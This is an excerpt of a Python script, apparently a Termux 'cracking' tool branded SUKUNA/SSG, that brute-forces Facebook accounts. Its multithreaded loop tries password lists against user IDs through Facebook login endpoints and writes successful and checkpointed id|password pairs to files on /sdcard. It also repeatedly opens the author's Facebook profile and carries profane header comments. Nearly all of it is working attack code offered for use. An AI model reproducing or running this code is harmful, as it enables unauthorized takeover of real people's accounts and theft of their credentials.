#SUKUNA FUCKED BY SSG
#AAUKAT BANA AFNO 
#SUKUNA RICH HONI FERII!!
#FULLY WORKING COMMAND 
#YOUR DAD SUKUNA RICH HERE
#DON'T SHOW YOUR FUCKING ATTITUDE!
#-----------LUN MODULES-----------
from os import path
...
logo=("""\033[1;32m              
  ...
  _____________ ___ ____  __.____ __________      _____   
 /   _____/    |   \    |/ _|    |   \      \    /  _  \  
 \_____  \|    |   /      < |    |   /   |   \  /  /_\  \ 
 /        \    |  /|    |  \|    |  /    |    \/    |    \
/_______  /______/ |____|__ \______/\____|__  /\____|__  /
        \/                 \/               \/         \/ 
...
def menu():
        try:
                clear()
                os.system(' xdg-open https://www.facebook.com/profile.php?id=100075161761326')
                if 1==1:
                        clear()
                        ...
                        if xd in ['1','01']:
                                os.system(' xdg-open https://www.facebook.com/profile.php?id=100075161761326');clear()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        linex()
                                        print(f'\033[1;37mDATA USE THEN COME OK ID')
                                        linex()
                                        for user in fo:
                                ...
                                os.system(' xdg-open https://www.facebook.com/profile.php?id=100075161761326');menu()
                        elif xd in ['3','03']:
                                exit('BYE BYE FANS FUCKED BY SSG') 
                        elif xd in ['4','04']:
                                clear()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                open('/sdcard/sukuna-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [JXB-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/sukuna-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [sukuna] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [sukuna-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/sukuna-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[sukuna-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [sukuna-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/sukuna-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [sukuna-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/sukuna-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [sukuna-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/sukuna-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
